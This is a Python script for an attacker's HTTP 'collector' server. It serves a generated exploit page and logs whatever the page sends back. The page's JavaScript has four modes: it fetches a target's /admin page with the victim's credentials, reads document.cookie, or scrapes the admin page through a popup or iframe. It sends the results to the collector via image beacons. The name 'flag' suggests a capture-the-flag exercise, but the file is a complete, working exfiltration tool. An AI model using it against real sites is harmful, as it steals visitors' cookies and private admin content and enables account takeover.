from __future__ import annotations

import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, quote, urlparse

LOG_PATH = Path("collector.log")


def build_exploit_html(target: str, mode: str) -> str:
    return f"""<!doctype html>
<html><body>
<script>
const TARGET = {target!r};
const hit = (k, v) => new Image().src = '/c?' + k + '=' + encodeURIComponent(v);
(async () => {{
  try {{
    if ({mode!r} === 'A') {{
      const r = await fetch(TARGET + '/admin', {{credentials:'include'}});
      hit('body', await r.text());
    }} else if ({mode!r} === 'B') {{
      hit('cookie', document.cookie || '');
    }} else if ({mode!r} === 'C') {{
      var w = window.open(TARGET + '/admin');
      setTimeout(() => {{
        try {{ hit('flag', w.document.body.innerText || ''); }}
        catch (e) {{ hit('openErr', String(e)); }}
      }}, 3000);
    }} else {{
      var f = document.createElement('iframe');
      f.src = TARGET + '/admin';
      document.body.appendChild(f);
      f.onload = () => {{
        try {{ hit('iframe', f.contentDocument.body.innerText || ''); }}
        catch (e) {{ hit('iframeErr', String(e)); }}
      }};
    }}
  }} catch (e) {{
    hit('err', String(e));
  }}
}})();
</script>
collector ready
</body></html>"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args):
        return

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        if parsed.path == "/exploit.html":
            target = (params.get("target") or ["http://127.0.0.1:3000"])[0]
            mode = (params.get("mode") or ["A"])[0]
            body = build_exploit_html(target, mode).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if parsed.path == "/c" or (parsed.path == "/" and parsed.query):
            line = f"GET {self.path} from {self.client_address[0]}"
            print(line, flush=True)
            with LOG_PATH.open("a", encoding="utf-8") as fp:
                fp.write(line + "\n")
            body = b"ok"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        body = b"collector"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=7777)
    args = parser.parse_args()

    LOG_PATH.write_text("", encoding="utf-8")
    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    print(f"collector listening on 0.0.0.0:{args.port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
